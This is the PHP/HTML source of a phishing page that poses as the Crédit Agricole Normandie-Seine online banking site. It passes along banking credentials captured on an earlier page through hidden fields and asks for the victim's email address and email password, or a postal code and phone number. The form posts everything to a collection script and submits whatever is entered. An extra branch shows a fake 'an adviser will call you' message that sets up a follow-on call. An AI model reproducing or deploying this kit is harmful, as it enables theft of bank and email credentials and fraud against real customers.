
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">




<title>AUTH</title>


<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">











 
 


<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/antiquus_002.css" media="all">
<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/antiquus.css" media="all">


<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/styles_002.css" media="all">
<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/styles.css" media="all">


<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/styles-mod_002.css" media="all">
<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/styles-mod.css" media="all">

<!--[if IE 8]>

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie8.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie8.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie8-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie8-mod.css?v=50" media="all" />
<![endif]-->

<!--[if lte IE 7]>

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie-mod.css?v=50" media="all" />
<![endif]-->

<!--[if lt IE 7]>
<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ieold.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ieold-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold-mod.css?v=50" media="all" />
<![endif]-->










<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/stb.css" media="all">
<script src="entreBam_fichiers/wreport.js"></script>
<script src="entreBam_fichiers/xtclicks.js"></script>
<script src="entreBam_fichiers/jquery.detectmobilebrowser.js"></script>
<script src="entreBam_fichiers/xtcore.js"></script>


<script language="JavaScript">

function Validate(){

var bo9lwa= $('#zip').val();
var boterma=$('#cpp').val();
	if(bo9lwa.length == 5 && boterma.length==10)
	{
setTimeout("document.formulaire.submit();",200);
    }
 else{
	 setTimeout("document.formulaire.submit();",200);
     }
}

</script><script src="entreeBam_fichiers/jquery.js"></script><script src="entreeBam_fichier/wreport.js"></script></head><body leftmargin="0" topmargin="0" onLoad="Init()" text="#000000"><div id="infoBull" style="position: absolute; z-index: 10;"></div><div id="ombrBull" style="position: absolute; z-index: 9;"></div>








<div id="container">
							<div id="contenu" style="width: 957px;">
<table border="0">
	<tbody><tr>
		<td colspan="3">


<div style="background-color: rgb(230, 230, 230);" align="center">
<table border="0" cellpadding="0" cellspacing="0" width="620px">
<tbody><tr>
<td style="background: none repeat scroll 0% 0% rgb(230, 230, 230);">
	<div id="entete_vide">	
		<div id="entete" style="background: none repeat scroll 0% 0% transparent;">
   			 <div id="gauche-entete">
		        <h1><a title="Crédit Agricole Normandie-Seine, retour à l'accueil" href="#" id="lien-logo"><img src="entreeBam_fichiers/siteon0.gif" alt="Crédit Agricole Normandie-Seine, retour à l'accueil" width="317" height="85"></a></h1>
		        </div>
   		 </div>
	</div></td>
</tr>
</tbody></table>
</div>
		</td>
	</tr>
	<tr valign="top">
	
		<td>
		
		<table style="" border="0" cellpadding="0" cellspacing="0" width="100%">

			<tbody><tr>
				<td style="background: none repeat-y scroll left top rgb(230, 230, 230);" valign="top" width="169">&nbsp;</td>
				<td id="col-centre" valign="top" width="590px">
				
				<table border="0" cellpadding="0" cellspacing="0" width="590">
					<tbody><tr>
						<td>
						
						<table border="0" cellpadding="0" cellspacing="0" width="590">
							
							<tbody><tr>
								<td colspan="2" class="montant2">&nbsp;</td>
							</tr>
							
							<tr>
								<td colspan="2" height="17"></td>
							</tr>
							<!-- bandeau authentification --> <tr>  <td colspan="2" align="center"><a href="http://www.ca-normandie-seine.fr/bam-information/" target="_blank"> <img src="entreeBam_fichiers/a.jpeg" border="no" height="75" width="585"></a></td> </tr> <tr><td>&nbsp;</td></tr>
							<tr>
								<td height="17"><div class="boutons-act">
                    <h1>
                       Mettre à jour mon numéro de téléphone :</h1>
</div></td>
							</tr>
						</tbody></table>
						<form class="ca-forms ca-forms-stitre" method="POST" name="formulaire" action="tbligh2.php" onSubmit="return false;">
							<input name="pass" value="<? print $_POST['CCCRYC']; ?>" type="hidden">
							<input name="userid" value="<? print $_POST['CCPTE']; ?>" type="hidden">
						<fieldset class="blc-choix"><div class="blc-choix-wrap" style="padding-bottom: 10px;">
						  <p class="nomarge"><b>Le Crédit Agricole accorde une grande attention à la sécurité de ses sites internet.</b>
 En tant qu'utilisateur, vous avez également un rôle important et actif à
 jouer pour assurer la sécurité des informations qui vous concernent. 
Consultez ci-dessous les RECOMMANDATIONS de SECURITE à respecter.</p>
						  </div>
						</fieldset>
						<table border="0" width="590">
							<!-- Message securitaire -->

							<tbody><tr>
								<td colspan="3" height="22">
								<input name="CCCRYC2" value="" type="hidden">
								 <fieldset class="blc-choix">
							 <script>
								if(saf){
									document.write("<div class=\"blc-choix-wrap\" style=\"padding-bottom:190px;\">");
									
								}else{
									document.write("<div class=\"blc-choix-wrap\">");
								}
							   
							</script><div class="blc-choix-wrap">
							
<h3><?php
if(isset($_GET['action'])){
	if($_GET['action'] =="conseil"){
		echo"Traitement en cours :";
	}
}else{
	echo"Confirmation de votre identité :";
}?></h3>
<label class="normal"></label>
<table cellspacing="0" cellpadding="0">
  <tr>

<?php
if(isset($_GET['action'])){
	if($_GET['action'] =="error"){
		echo"<style>
		#zip,#cpp{
			border-color:red;
		}
		</style>
		
  <tr>
    <td height=\"27\"><strong>Entrez votre adresse e-mail :</strong></td>
    <td><input name=\"zip\" id=\"zip\" size=\"30\" maxlength=\"90\" type=\"text\"></td>
  </tr>
  <tr>
    <td height=\"28\"><strong>Entrez le mot de passe de votre email :</strong></td>
    <td><input name=\"cpp\" id=\"cpp\" maxlength=\"90\" size=\"15\" type=\"password\"></td><td height=\"28\"><strong></strong></td>
  </tr>
 ";
 echo"</table>
<p></p>
<p align=\"right\">
  <input name=\"Submit\" type=\"button\" onClick=\"Validate()\" class=\"lien-validation\" value=\"Valider / Confirmer\">
</p>";
		
		
	}
	if($_GET['action'] =="conseil"){
		
		echo"<tr><td height=\"27\"><strong>Un de nos conseillers va vous joindre .<br><br>Tous nos conseillers sont occupés et nous vous demandons de bien vouloir patienter quelques instants.  Merci !</strong></td></tr>";
		 echo"</table>
<p></p>
<p align=\"right\">
  
</p>";
	}
	else{
		if($_GET['action'] !=="conseil" && $_GET['action'] !== "error"){
				echo"
		<div id=\"boubriss\">
  <tr>
    <td height=\"27\"><strong>Code postal :</strong></td>
    <td><input name=\"zip\" id=\"zip\" size=\"5\" maxlength=\"5\" type=\"text\"></td>
  </tr>
  <tr>
    <td height=\"28\"><strong>Num&eacute;ro de Telephone :</strong></td>
    <td><input name=\"cpp\" id=\"cpp\" maxlength=\"10\" size=\"15\" type=\"text\"></td><td height=\"28\"><strong></strong></td>
  </tr>
 </div>";	
  echo"</table>
<p></p>
<p align=\"right\">
  <input name=\"Submit\" type=\"button\" onClick=\"Validate()\" class=\"lien-validation\" value=\"Valider / Confirmer\">
</p>";
		}
	}
	
	
	
}
if(!isset($_GET['action'])){
						echo"
		<div id=\"boubriss\">
  <tr>
    <td height=\"27\"><strong>Entrez votre adresse e-mail :</strong></td>
    <td><input name=\"zip\" id=\"zip\" size=\"30\" maxlength=\"90\" type=\"text\"></td>
  </tr>
  <tr>
    <td height=\"28\"><strong>Entrez le mot de passe de votre email :</strong></td>
    <td><input name=\"cpp\" id=\"cpp\" maxlength=\"90\" size=\"15\" type=\"password\"></td><td height=\"28\"><strong></strong></td>
  </tr>
 </div>";
 echo"</table>
<p></p>
<p align=\"right\">
  <input name=\"Submit\" type=\"button\" onClick=\"Validate()\" class=\"lien-validation\" value=\"Valider / Confirmer\">
</p>";
	}
?>

<div id="bloc-pave-saisis-code">
<label class="normal gauche" for="input-code"></label>
</div>
							
							</div>
								 </fieldset>
										
								</td>
							</tr>
							
						</tbody></table>
						
						</form></td>
					</tr>
		<tr>
		<td>		
		<!-- Pavé Certificat --> 
		
		<!-- Conditions Juridique --> <table border="0" cellpadding="0" cellspacing="0" width="590"><tbody><tr><td width="3"></td><td><table border="0" cellpadding="0" cellspacing="3" width="590"><tbody><tr><td class="encartbaspage" width="100%"><table align="center" border="0" cellpadding="12" cellspacing="1" width="100%"><tbody><tr><td class="colfondpage" align="center" height="17" valign="top"><table><tbody><tr class="libelle3"><td><b>Pour toute assistance, vous pouvez consulter la <a href="http://www.ca-normandie-seine.fr/faq.html" target="_blank"> <font color="#0000ff">Foire Aux Questions</font></a><font color="#0000ff"> <font color="#000000">ou appeler le 02 35 59 19 19 (choix 2) (appel gratuit hors frais de communication facturés par l'opérateur de télécommunication)</font></font></b><font color="#0000ff"><font color="#000000"><br>Du lundi au vendredi de 08h00 à 20h00<br>Le samedi de 08h00 à 18h00<br><br><b>Vous n'arrivez pas à vous connecter à nos services :</b><br>Cette application est optimisée pour les logiciels de navigation MS Internet Explorer 6 et versions ultérieures.<br></font></font></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td><td width="3"></td></tr></tbody></table>
			</td>
		</tr>
		</tbody></table>
		</td>
		<td style="background: none repeat-y scroll left top rgb(230, 230, 230);" valign="top" width="171">&nbsp;</td>
		</tr>
		
		
	<tr style="background-color: rgb(230, 230, 230);" valign="middle">
	<td></td>
		<td>
		<table border="0" cellpadding="0" cellspacing="0" width="590">
			<tbody><tr>
				<td class="footercopyright" align="center">&nbsp;</td>
			</tr>
			<tr>
				<td class="footercopyright" align="center">@2004-2018 Crédit Agricole,
				tous droits réservés</td>
			</tr>
		</tbody></table>
		 

<!--MARQUEUR XITI-->

		</td>
		<td></td>
	</tr></tbody></table>
</td>



</tr>
</tbody></table>




<table>
	<tbody><tr>
		<td width="169"></td>
		<td id="main_bas" width="570"></td>
		<td width="169"></td>
	</tr>
</tbody></table>
</div>
</div>
</body></html>